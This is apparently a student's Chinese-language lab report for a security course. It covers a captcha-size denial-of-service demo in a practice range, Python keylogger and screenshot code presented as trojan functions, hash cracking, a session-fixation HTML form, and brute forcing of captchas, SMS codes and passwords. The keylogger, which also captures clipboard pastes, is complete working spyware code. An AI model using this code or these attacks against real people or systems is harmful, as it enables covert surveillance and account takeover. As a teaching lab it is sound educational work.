# lab5: 拒绝服务攻击

## 5.1 : 内容大小可控导致的拒绝服务攻击漏洞原理以及演示

进入靶场, 检查元素:
![img:lab5-check](https://i.imgur.com/mWKSTfn.png)

检查 url 地址:
![img:5-url](https://i.imgur.com/DkWaVhR.png)


修改验证码图片大小:
![img:5-size](https://i.imgur.com/5usWesC.png)

设置浏览器代理:
![img:set-proxy](https://i.imgur.com/OFTMdit.png)


burp suite 拿到数据包:
![img:burp-suite](https://i.imgur.com/kjBKUP1.png)
通过 burp suite 写脚本批量消耗资源, 抓取数据包, 发到 repeater 模块:
![img:repeater](https://i.imgur.com/i8uUmQG.png)

点击 go 发送数据包, 默认大小是 718:
![img:default-size](https://i.imgur.com/uk1y2IE.png)
修改长宽, 可以看到延迟变高, 如果继续增大, 并批量运行可以发生宕机
![img:chang-lw](https://i.imgur.com/21h4WeB.png)

# lab6: 计算机木马
## 6.1 编程实现键盘记录功能

掌握木马的键盘记录功能的编程实现技术, 操作系统为 Windows, 并安装 Python 开发环境以及 Python 第三方库 PyHook
- 调试 7.2.6 节给出的 keylogger.py 程序.
- 运行 keylogger.py 程序.
- 修改 Windows 用户口令(或者文本文件), 观察 keylogger.py 程序的记录结果.


使用 pyhook 库, 需要下载依赖(还需要 visual studio):
```sh
pip install swig
pip install wheel
pip install pyhook3
```

```python
from ctypes import *
import pythoncom
import PyHook3 as pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    global current_window, executable
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value # 获得进程 PID
    executable = create_string_buffer(b"\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512) # 获得进程名
    window_title = create_string_buffer(b"\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512) # 获得窗口名
    current_window = window_title.raw.decode('utf-8', errors='replace')
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def key_event(event):
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
        print()
        print("[ PID: %s - %s - %s ]" % (current_window, executable.value.decode(), current_window))
        print()
    if event.Ascii > 32 and event.Ascii < 127:
        print(chr(event.Ascii), end='')
    else:
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[PASTE]-%s" % pasted_value)
        else:
            print("[%s]" % event.Key)
    return True

def key_logger():
    hooker = pyHook.HookManager()
    hooker.KeyDown = key_event
    hooker.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == '__main__':
    key_logger()
```

测试按键:
![img:pyhook](https://i.imgur.com/YrvQSNJ.png)


使用keyboard 库:
```python
import keyboard
from typing import List

def recorder():
    recorded: List[keyboard.KeyboardEvent] = []
    def callback(event: keyboard.KeyboardEvent):
        if event.name == 'esc':
            keyboard.unhook(callback) # 停止监听键盘事件
        else:
            recorded.append(event)
    keyboard.on_press(callback)
    # 循环监听键盘事件, 直到按下 Enter 键后退出循环
    while True:
        if keyboard.is_pressed('esc'):
            break
    recorded = [e.name for e in recorded]
    print("The recorder: ", recorded)

if __name__ == '__main__':
    recorder()
```

![img:keyboard](https://i.imgur.com/07KDdWZ.png)

## 6.2 编程实现截屏功能


基本实现:
```python
import win32gui
import win32ui
import win32con
import win32api

def screen_shot():
    hdesktop = win32gui.GetDesktopWindow()
    # 获得显示器尺寸
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top),win32con.SRCCOPY)
    screenshot.SaveBitmapFile(mem_dc, './screen.jpg')
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

if __name__ == '__main__':
    screen_shot()
```
> 测试效果
![img:screen](./screen.jpg)

修改程序使之具有添加时间戳的功能:
```python
from datatime import datetime
import win32gui
import win32ui
import win32con
import win32api

def screen_shot():
    hdesktop = win32gui.GetDesktopWindow()
    # 获得显示器尺寸
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top),win32con.SRCCOPY)
    now = datetime.now()
    timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"./screen_{timestamp}.jpg"
    screenshot.SaveBitmapFile(mem_dc, filename)
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

if __name__ == '__main__':
    screen_shot()
```

> 测试效果
![img:datetime](https://i.imgur.com/aL6hxlK.png)


范围截屏:
```python
import win32gui
import win32ui
import win32con
import win32api
def screen_shot(left, top, width, height):
    hdesktop = win32gui.GetDesktopWindow()
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    screenshot.SaveBitmapFile(mem_dc, './screen-range.jpg')
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())
if __name__ == '__main__':
    left = int(input("请输入要截取区域的左上角横坐标: "))
    top = int(input("请输入要截取区域的左上角纵坐标: "))
    width = int(input("请输入要截取区域的宽度: "))
    height = int(input("请输入要截取区域的高度: "))
    screen_shot(left, top, width, height)
```

> 测试效果
![img:range](.)

# lab7: 身份认证与口令攻击技术

<!-- ## 7.1 文件口令破解 -->
<!---->
<!-- ### 实验环境 -->
<!-- - Office 文档口令破解软件 Advanced Office Password Recovery -->
<!-- - 压缩文档口令破解软件 Advanced Archive Password Recovery -->
<!-- - PDF 文档口令破解软件 Advanced PDF Password Recovery -->
<!---->
<!-- ### 实验要求 -->
<!-- - 安装口令破解软件 Advanced Office Password Recovery, Advanced Archive Password Recovery, Advanced PDF Password Recovery -->
<!-- - 破解指定 Office 文档的加密口令, 要求使用破解软件提供的多种破解选项进行破解, 比较不同破解方法的优劣 -->
<!-- - 破解指定 RAR 文档的加密口令, 要求使用破解软件提供的多种破解选项进行破解, 比较不同破解方法的优劣 -->
<!-- - 破解指定 PDF 文档的加密口令, 要求使用破解软件提供的多种破解选项进行破解, 比较不同破解方法的优劣 -->
<!-- - 将所有破解结果截图, 并写入实验报告中 -->
<!---->
<!-- ### 破解 Office 文档的加密口令 -->
<!---->
<!---->
<!-- ### 破解 RAR 文档的加密口令 -->
<!---->
<!---->
<!-- ### 破解 pdf 文档 -->

## 7.2 加密口令值破解
- 接入互联网, 访问在线破解网站 cmd5, 破解指定的 MD5 和 SHA1 加密口
令值.
- 安装 MD5 密码暴力破解软件 MD5Crack, 并破解指定的 MD5 加密口令值.
- 弹出命令窗口运行 Bulk SHA1 破解指定 SHA1 加密口令值.
- 将所有破解结果截图, 并写入实验报告中

预计算一个 fuckyou 的哈希
![img:fuckyou](https://i.imgur.com/4kq9uVK.png)
- md5: 596a96cc7bf9108cd896f33c44aedc8a
- sha1: dd2edb87ea9eb7a32fd4057276d3a1fab861c1d5

CMD5 进行 MD5 破解
![img:cmd5](https://i.imgur.com/k50X7zT.png)

md5crack 破解  和 BulkSHA1 破解大同小异, 只是工具
![b](https://i.imgur.com/Oz4O82Z.png)
![a](https://i.imgur.com/ErRXfyb.png)

## 7.3 登录安全漏洞原理以及演示


### 会话攻击漏洞
管理员登陆(这里有个坑就是这个链接会触发 js 请求, 要保证靶机必须能够连网, 默认是设置了静态 IP, 改成 DHCP)
![img:admin](https://i.imgur.com/P4D3op2.png)

添加用户, 并登录
<!-- ![img:new-user](https://i.imgur.com/0T2UDDH.png) -->
![img:new-user](https://i.imgur.com/YXmd8m0.png)
![img:login](https://i.imgur.com/gAX1AdZ.png)

很容易就能找到 sessionid
![img:sessionid](https://i.imgur.com/jTcCiWv.png)
> klvg1b04i5u2ep7sqss3p7egi5

<!-- ![img:sessionid](https://i.imgur.com/i3pAjTL.png) -->
<!-- > q79p9notaah74kk9gvp43i4k52 -->

构造一个 html 文件
```html
<html>
    <body>
    <form action="http://www.huihuaguding.com/admin/" method="post">
    <input type="hidden" name="session_id"
    value="klvg1b04i5u2ep7sqss3p7egi5">
    <input type="submit" >
    </form>
    </body>
</html>
```

通过管理员界面上传文件
![img:fileup](https://i.imgur.com/nnFuzoI.png)

管理员重新登陆, 刷新普通用户界面, 变为管理员
![img:be-admin](https://i.imgur.com/efvrXuN.png)

### XSS 漏洞盗取用户 cookie

站点失效了
![ji](https://i.imgur.com/I7vcSak.png)

### 中间人劫持窃取用户凭证

设置下局域网
![img:networkset](https://i.imgur.com/fG8p68p.png)

## 7.4 验证码常见漏洞原理以及演示

### 短信验证码
burpsuite 拦截登陆请求包
![img:before](https://i.imgur.com/gEpuKfj.png)
![img:intercept](https://i.imgur.com/7CPXqAc.png)


然后照葫芦画瓢穷举攻击即可
![attack](https://i.imgur.com/wxkaTH3.png)


### 图形验证码

burpsuite 拦截
<!-- ![bu](https://i.imgur.com/OIxjiP2.png) -->
![bu](https://i.imgur.com/Yuifz40.png)

选择 password
![setpass](https://i.imgur.com/PTRTBje.png)

然后枚举几个值, 查看 response 可以复用验证码
![reuse](https://i.imgur.com/QtOqIdm.png)


## 7.5 账号密码爆破

直接输入一个字典
![diary](https://i.imgur.com/iajjjz1.png)


可以找到一个不同长的 response, 密码为`admin888`可以登陆成功: 
![admin888](https://i.imgur.com/tdEu7jw.png)

mysql 密码爆破
![mysqlpass](https://i.imgur.com/F1ZJ78B.png)
